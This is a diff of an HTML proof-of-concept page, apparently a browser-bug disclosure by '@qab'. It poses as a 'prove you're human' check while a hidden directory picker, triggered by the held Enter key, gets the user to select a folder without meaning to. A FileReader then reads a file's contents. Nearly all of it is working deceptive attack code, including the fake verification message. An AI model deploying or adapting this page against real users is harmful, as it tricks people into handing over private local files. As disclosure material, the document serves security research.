@@ -1,36 +1,43 @@
 <html>
 <head>
-
+    <title>
+		Read all files on PC - PoC - By @qab
+    </title>
+    <style>
+        #thing {
+            opacity: 0.0;
+        }
+    </style>
 </head>
+
 <body>
-<style>
-#q{
-opacity:0.0;
-}
-</style>
+    <h3 id="qmsg">Hold down the ENTER key for 5 seconds to prove you're human..</h3>
+    <input id="thing" type="file" webkitdirectory mozdirectory accept="text/*" />
 
-<b>Hold down enter for 5 seconds to prove you're human</b>
-<input type=file id=q webkitdirectory='true'><br>
-<textarea id="qtxt" style="height:300px;">Things grabbed:</textarea>
-<script>
-var i=25;
-document.onkeypress=function(e){if(q.value.length>0){qtxt.value+=(q.value+'\n');}
-	if(q.value=='Documents'){
-		window.i=1000;
-		}
-	if(e.key==='Enter'){
-		window.i--;
-		if(window.i<3){
-			q.click();
-		}
-	}
-};
-
-q.onchange=function(){
-if(window.i>10){
-	document.body.innerHTML=('I can read '+q.files.length+' files from Documents folder');
-	}
-}
-</script>
+    <script>
+	
+		  var r = new FileReader();
+        thing.onchange = function() {
+            alert('I can read ' + this.files.length + ' files from anywhere on your pc!');//This is for PoC only. We can access all data using this.files as seen next.
+			r.onload=function(){
+				alert(r.result);
+			};
+			
+			r.readAsText(thing.files[0]);
+        };
+		
+        //This is where we detect if the user is holding the Enter button.
+        var i = 0;
+        document.onkeydown = function() {
+            i++;
+            if (i > 4) {
+                thing.click();
+                i = -10000;
+                document.onkeydown = null;
+                setTimeout(function() {
+                    qmsg.innerHTML = '<u>Thank you! Please wait while we verify (this might take a few minutes).</u>';
+                }, 1000);
+            };
+        };
+    </script>
 </body>
-</html>
